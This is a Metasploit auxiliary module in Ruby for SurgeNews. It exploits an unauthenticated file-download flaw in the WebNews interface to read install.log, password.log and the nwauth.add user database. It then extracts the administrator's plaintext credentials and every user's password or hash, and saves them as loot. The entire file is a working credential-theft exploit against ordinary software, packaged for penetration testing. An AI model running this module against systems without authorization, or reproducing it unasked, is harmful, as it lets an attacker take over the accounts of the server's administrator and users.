##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  HttpFingerprint = { :pattern => [ /DManager/ ] }

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'SurgeNews User Credentials',
      'Description'    => %q{
        This module exploits a vulnerability in the WebNews web interface
        of SurgeNews on TCP ports 9080 and 8119 which allows unauthenticated
        users to download arbitrary files from the software root directory;
        including the user database, configuration files and log files.

        This module extracts the administrator username and password, and
        the usernames and passwords or password hashes for all users.

        This module has been tested successfully on SurgeNews version
        2.0a-13 on Windows 7 SP 1 and 2.0a-12 on Ubuntu Linux.
      },
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://news.netwinsite.com:8119/webnews?cmd=body&item=34896&group=netwin.surgemail'],
        ],
      'Author'         => 'bcoles',
      'DisclosureDate' => 'Jun 16 2017'))

    register_options [ Opt::RPORT(9080) ]
  end

  def max_retries
    3
  end

  def check_host(ip)
    @tries = 0
    res = read_file 'install.log'
    if res =~ /SurgeNews/
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end

  def read_file(file)
    data = nil
    @tries += 1
    vprint_status "Retrieving file: #{file}"
    res = send_request_cgi 'uri'      => normalize_uri(target_uri.path, 'webnews'),
                           'vars_get' => { 'cmd' => 'part', 'fname' => file }
    if !res
      vprint_error 'Connection failed'
    elsif res.code == 550
      vprint_error "Could not find file '#{file}'"
    elsif res.code == 200 && res.body =~ /550 Key: No key activated/
      # unregistered software throws an error once in every ~20 requests
      # try again...
      if @tries >= max_retries
        vprint_error "Failed to retrieve file '#{file}' after max retries (#{max_retries})"
      else
        vprint_status 'Retrying...'
        return read_file file
      end
    elsif res.code == 200 && !res.body.empty?
      vprint_good "Found #{file} (#{res.body.length} bytes)"
      data = res.body
    else
      vprint_error 'Unexpected reply'
    end
    @tries = 0
    data
  end

  def parse_log(log_data)
    return if log_data.nil?
    username = log_data.scan(/value_set\(manager\)\((.*)\)/).flatten.reject { |c| c.to_s.empty? }.last
    password = log_data.scan(/value_set\(password\)\((.*)\)/).flatten.reject { |c| c.to_s.empty? }.last
    { 'username' => username, 'password' => password }
  end

  def parse_user_db(user_data)
    return if user_data.nil?
    creds = []
    user_data.lines.each do |line|
      next if line.eql? ''
      if line =~ /^(.+?):(.*):Groups=/
        user = $1
        pass = $2
        # clear text credentials are prefaced with '*'
        if pass.starts_with? '*'
          creds << { 'username' => user, 'password' => pass[1..-1] }
        # otherwise its a hash
        else
          creds << { 'username' => user, 'hash' => pass }
        end
      end
    end
    creds
  end

  def run_host(ip)
    @tries = 0

    service_data = { address:      rhost,
                     port:         rport,
                     service_name: (ssl ? 'https' : 'http'),
                     protocol:     'tcp',
                     workspace_id: myworkspace_id }

    cred_table = Rex::Text::Table.new 'Header'  => 'SurgeNews User Credentials',
                                      'Indent'  => 1,
                                      'Columns' => ['Username', 'Password', 'Password Hash', 'Admin']

    # Read administrator password from password.log
    admin = parse_log read_file 'password.log'
    # If password.log doesn't contain credentials
    # then the password hasn't been updated since install.
    # Retrieve the credentials from install.log instead.
    admin = parse_log read_file 'install.log' if admin.nil?

    if admin.nil?
      vprint_error 'Found no administrator credentials'
    else
      print_good "Found administrator credentials (#{admin['username']}:#{admin['password']})"
      cred_table << [admin['username'], admin['password'], nil, true]

      credential_data = { origin_type:     :service,
                          module_fullname: fullname,
                          private_type:    :password,
                          private_data:    admin['password'],
                          username:        admin['username'] }

      credential_data.merge! service_data
      credential_core = create_credential credential_data
      login_data = { core:         credential_core,
                     access_level: 'Administrator',
                     status:       Metasploit::Model::Login::Status::UNTRIED }
      login_data.merge! service_data
      create_credential_login login_data
    end

    # Read user credentials from nwauth.add
    users = parse_user_db read_file 'nwauth.add'
    if users.nil?
      vprint_error 'Found no user credentials in nwauth.add'
    else
      vprint_status "Found #{users.length} users in nwauth.add"
    end

    users.each do |user|
      next if user.empty?

      cred_table << [user['username'], user['password'], user['hash'], false]

      if user['password']
        print_good "Found user credentials (#{user['username']}:#{user['password']})"
        credential_data = { origin_type:     :service,
                            module_fullname: fullname,
                            private_type:    :password,
                            private_data:    user['password'],
                            username:        user['username'] }
      else
        credential_data = { origin_type:     :service,
                            module_fullname: fullname,
                            private_type:    :nonreplayable_hash,
                            private_data:    user['hash'],
                            username:        user['username'] }
      end

      credential_data.merge! service_data
      credential_core = create_credential credential_data
      login_data = { core:         credential_core,
                     access_level: 'User',
                     status:       Metasploit::Model::Login::Status::UNTRIED }
      login_data.merge! service_data
      create_credential_login login_data
    end unless users.nil?

    print_line
    print_line cred_table.to_s

    p = store_loot 'surgenews.user.creds', 'text/csv', rhost, cred_table.to_csv, 'SurgeNews User Credentials'
    print_good "Credentials saved in: #{p}"
  end
end
